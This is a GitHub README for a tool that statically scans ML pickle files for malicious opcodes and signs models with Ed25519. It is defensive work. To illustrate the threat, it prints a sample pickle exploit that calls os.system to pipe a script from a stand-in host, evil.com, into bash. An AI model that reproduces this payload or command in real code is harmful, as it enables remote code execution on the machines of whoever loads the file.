# Model-Supply-Chain-Auditor

![CI](https://github.com/poojakira/Model-Supply-Chain-Auditor/actions/workflows/ci.yml/badge.svg)
![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)
![Coverage 83%](https://img.shields.io/badge/coverage-83%25-green.svg)
![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)

**Detects malicious code in ML model files before they execute.** Static analysis of pickle bytecode + Ed25519 cryptographic model signing.

```
$ python scan.py model.pkl
[MALICIOUS] model.pkl
  - DANGEROUS import at byte 25: subprocess.Popen
  - Code execution via REDUCE at byte 38
```

---

## Why This Exists

ML models are distributed as serialized files (`.pkl`, `.pt`, `.h5`). Python's pickle format can execute arbitrary code during deserialization — a malicious model downloaded from a hub achieves Remote Code Execution on the victim's machine.

**Real-world incidents:**
- HuggingFace detected malicious pickles in uploaded models (2023)
- PyTorch `.pt` files are ZIP archives containing pickle data
- Backdoored models distributed via public model registries

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    Model File (.pkl/.pt)                     │
└─────────────────────┬───────────────────────────────────────┘
                      │
          ┌───────────┴───────────┐
          ▼                       ▼
┌─────────────────────┐ ┌─────────────────────────┐
│   Pickle Scanner    │ │   Ed25519 Signing       │
│                     │ │                         │
│ pickletools.genops()│ │ SHA-256 hash            │
│ → GLOBAL opcodes    │ │ → Ed25519 sign          │
│ → STACK_GLOBAL      │ │ → signature file        │
│ → REDUCE detection  │ │                         │
│                     │ │ Verify before loading:  │
│ Output: risk level  │ │ hash match + sig valid  │
│ safe/suspicious/    │ │ → allow or reject       │
│ malicious           │ │                         │
└─────────────────────┘ └─────────────────────────┘
```

## Components

### Pickle Malware Scanner (`src/scanners/pickle_scanner.py`)

Disassembles pickle bytecode and detects:
- `GLOBAL`/`STACK_GLOBAL` opcodes importing dangerous modules (`os`, `subprocess`, `eval`, etc.)
- `REDUCE` opcodes that execute imported callables
- Known attack patterns: reverse shells, data exfiltration, arbitrary command execution

Same approach as [Trail of Bits' Fickling](https://github.com/trailofbits/fickling) — parse opcodes WITHOUT executing them.

### Model Signing (`src/signing/model_signer.py`)

Cryptographic provenance using Ed25519:
1. Compute SHA-256 hash of model file
2. Sign hash with Ed25519 private key
3. Verify signature before loading any model

Ed25519: deterministic, 32-byte keys, 64-byte signatures, no nonce reuse vulnerabilities.

### SafeTensors Validator (`src/safetensors_scanner.py`)

Validates SafeTensors file integrity: header bounds, tensor alignment, suspicious metadata detection.

## Usage

```bash
pip install -r requirements.txt

# Scan a pickle file for malware
python scan.py model.pkl --verbose

# Full verification demo
python verify.py
```

```python
from src.scanners import scan_pickle_bytes
from src.signing import generate_signing_keypair, sign_model, verify_model

# Scan pickle bytes
result = scan_pickle_bytes(data)
print(result.risk_level)  # "safe", "suspicious", or "malicious"

# Sign and verify a model
private_key, public_key = generate_signing_keypair()
sig = sign_model("model.pt", private_key, signer="training-pipeline-v1")
assert verify_model("model.pt", sig, public_key)
```

## How Pickle RCE Works

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl http://evil.com/shell.sh | bash",))

payload = pickle.dumps(Exploit())  # Creates malicious bytes
# pickle.loads(payload)  ← RCE happens here. We never call this.
```

Our scanner detects this by parsing the opcodes statically:
```
SHORT_BINUNICODE  'nt'        ← dangerous module
SHORT_BINUNICODE  'system'    ← dangerous callable
STACK_GLOBAL                  ← combines into nt.system
REDUCE                        ← would execute on loads()
```

## Testing

```bash
pytest tests/ -v --cov=src
```

28 tests covering real attack patterns, real cryptographic operations, and real file format validation. 83% code coverage.

## What's Real vs. What's Not Implemented

| Component | Status |
|-----------|--------|
| Pickle opcode scanning | ✅ Real. Uses `pickletools.genops()` — same as Fickling. |
| Ed25519 signing | ✅ Real cryptography via `cryptography` library. |
| SafeTensors validation | ✅ Real format parsing and integrity checks. |
| Dangerous module detection | ✅ Catches known patterns. Novel obfuscation may evade. |
| Neural backdoor detection | ❌ Not implemented. Requires Neural Cleanse (Wang et al., 2019). |
| SBOM generation | ❌ Not implemented. Would integrate with CycloneDX/SPDX. |

## References

1. Trail of Bits, ["Fickling: A Python Pickle Decompiler and Analyzer"](https://github.com/trailofbits/fickling) (2021)
2. OWASP, [LLM05: Supply Chain Vulnerabilities](https://owasp.org/www-project-machine-learning-security-top-10/)
3. Bernstein, D. et al., "High-speed high-security signatures" (2012) — Ed25519
4. HuggingFace, ["Security at Hugging Face: Pickle Scanning"](https://huggingface.co/docs/hub/security-pickle) (2023)

## License

MIT — Pooja Kiran ([@poojakira](https://github.com/poojakira))
